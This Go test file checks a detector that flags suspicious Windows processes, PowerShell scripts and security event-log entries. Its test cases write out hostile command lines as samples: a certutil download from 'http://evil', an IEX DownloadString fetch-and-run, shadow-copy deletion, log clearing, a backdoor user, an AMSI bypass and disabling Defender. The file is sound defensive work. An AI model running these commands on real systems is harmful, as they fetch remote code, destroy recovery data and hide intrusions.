package authlog

import "testing"

func TestWindowsSuspicious(t *testing.T) {
	cases := []struct {
		exe, cmd, parent string
		want             bool
	}{
		{`C:\Windows\System32\certutil.exe`, `certutil -urlcache -split -f http://evil/x.exe x.exe`, `C:\Windows\System32\cmd.exe`, true},
		{`C:\Windows\System32\certutil.exe`, `certutil -hashfile setup.exe SHA256`, `C:\Windows\System32\cmd.exe`, false},
		{`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -nop -w hidden -enc SQBFAFgA`, `C:\Windows\explorer.exe`, true},
		{`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -NoProfile -File C:\scripts\backup.ps1`, `C:\Windows\System32\svchost.exe`, false},
		{`C:\Windows\System32\cmd.exe`, `cmd /c dir`, `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`, true},
		{`C:\Windows\System32\cmd.exe`, `cmd /c dir`, `C:\Windows\explorer.exe`, false},
		{`C:\Windows\System32\vssadmin.exe`, `vssadmin delete shadows /all /quiet`, `C:\Windows\System32\cmd.exe`, true},
		{`C:\Windows\System32\vssadmin.exe`, `vssadmin list shadows`, `C:\Windows\System32\cmd.exe`, false},
		{`C:\Tools\mimikatz.exe`, ``, `C:\Windows\System32\cmd.exe`, true},
		{`C:\Windows\System32\net.exe`, `net user hacker P@ss /add`, `C:\Windows\System32\cmd.exe`, true},
		{`C:\Windows\System32\net.exe`, `net view`, `C:\Windows\System32\cmd.exe`, false},
		{`C:\Windows\System32\rundll32.exe`, `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`, `C:\Windows\explorer.exe`, true},
		{`C:\Windows\System32\wevtutil.exe`, `wevtutil cl Security`, `C:\Windows\System32\cmd.exe`, true},
		{`C:\Windows\System32\schtasks.exe`, `schtasks /create /tn upd /tr c:\x.exe /sc minute`, `C:\Windows\System32\cmd.exe`, true},
		{`C:\Windows\System32\schtasks.exe`, `schtasks /query`, `C:\Windows\System32\cmd.exe`, false},
		{`C:\Program Files\Roster\agent.exe`, ``, `C:\Windows\System32\services.exe`, false},
	}
	for _, c := range cases {
		_, got := suspiciousProcess(c.exe, c.cmd, c.parent)
		if got != c.want {
			t.Errorf("%s | %s | %s: got %v, want %v", c.exe, c.cmd, c.parent, got, c.want)
		}
	}
	for text, want := range map[string]bool{
		`IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')`:               true,
		`$ProgressPreference='SilentlyContinue'; Get-MpComputerStatus | ConvertTo-Json`: false, // Roster-Skript
		`Get-ChildItem C:\Users | Measure-Object`:                                       false,
		`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`:              true,
		`Set-MpPreference -DisableRealtimeMonitoring $true`:                             true,
		``: false,
	} {
		if _, got := suspiciousScript(text); got != want {
			t.Errorf("script %q: got %v, want %v", text, got, want)
		}
	}
}

func TestParseWindowsEventNewKinds(t *testing.T) {
	mk := func(id int, data map[string]string) WinEvent {
		return WinEvent{ID: id, Time: "2026-11-03T10:00:00Z", RecordID: 7, Data: data}
	}
	ev, ok := ParseWindowsEvent(mk(7045, map[string]string{"ServiceName": "EvilSvc", "ImagePath": `C:\Temp\e.exe`, "StartType": "auto start", "AccountName": "LocalSystem"}))
	if !ok || ev.Kind != "service_installed" || ev.Detail != `EvilSvc → C:\Temp\e.exe (auto start)` || ev.User != "LocalSystem" {
		t.Errorf("7045: %+v %v", ev, ok)
	}
	ev, ok = ParseWindowsEvent(mk(4698, map[string]string{"SubjectUserName": "admin", "TaskName": `\Updater`, "TaskContent": `<Task><Actions><Exec><Command>C:\x.exe</Command><Arguments>-q</Arguments></Exec></Actions></Task>`}))
	if !ok || ev.Kind != "task_created" || ev.Detail != `\Updater → C:\x.exe -q` {
		t.Errorf("4698: %+v %v", ev, ok)
	}
	ev, ok = ParseWindowsEvent(mk(1102, map[string]string{"SubjectUserName": "admin"}))
	if !ok || ev.Kind != "audit_cleared" || ev.User != "admin" {
		t.Errorf("1102: %+v %v", ev, ok)
	}
	ev, ok = ParseWindowsEvent(mk(4688, map[string]string{"SubjectUserName": "bob", "NewProcessName": `C:\Windows\System32\certutil.exe`, "CommandLine": `certutil -urlcache -f http://x/y z`, "ParentProcessName": `C:\Windows\System32\cmd.exe`}))
	if !ok || ev.Kind != "suspicious_process" || ev.User != "bob" || ev.Service != "process" {
		t.Errorf("4688: %+v %v", ev, ok)
	}
	if _, ok := ParseWindowsEvent(mk(4688, map[string]string{"NewProcessName": `C:\Windows\System32\notepad.exe`, "CommandLine": "notepad"})); ok {
		t.Error("harmloser Prozess darf nichts liefern")
	}
	ev, ok = ParseWindowsEvent(mk(4104, map[string]string{"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x')"}))
	if !ok || ev.Kind != "powershell_suspicious" || ev.Service != "powershell" {
		t.Errorf("4104: %+v %v", ev, ok)
	}
	if _, ok := ParseWindowsEvent(mk(4104, map[string]string{"ScriptBlockText": "Get-Date"})); ok {
		t.Error("harmloses Skript darf nichts liefern")
	}
}

func TestLogCursorMigration(t *testing.T) {
	c := Cursor{LastTime: "2026-11-03T10:00:00Z", RecordID: 5}
	if lc := c.logCursor("Security"); lc.RecordID != 5 {
		t.Fatalf("legacy: %+v", lc)
	}
	if lc := c.logCursor("System"); lc.RecordID != 0 {
		t.Fatalf("neu: %+v", lc)
	}
	c.setLogCursor("System", LogCursor{RecordID: 9, LastTime: "x"})
	c.setLogCursor("Security", LogCursor{RecordID: 6, LastTime: "y"})
	if c.Logs["System"].RecordID != 9 || c.RecordID != 6 || c.LastTime != "y" || c.logCursor("Security").RecordID != 6 {
		t.Fatalf("set: %+v", c)
	}
}
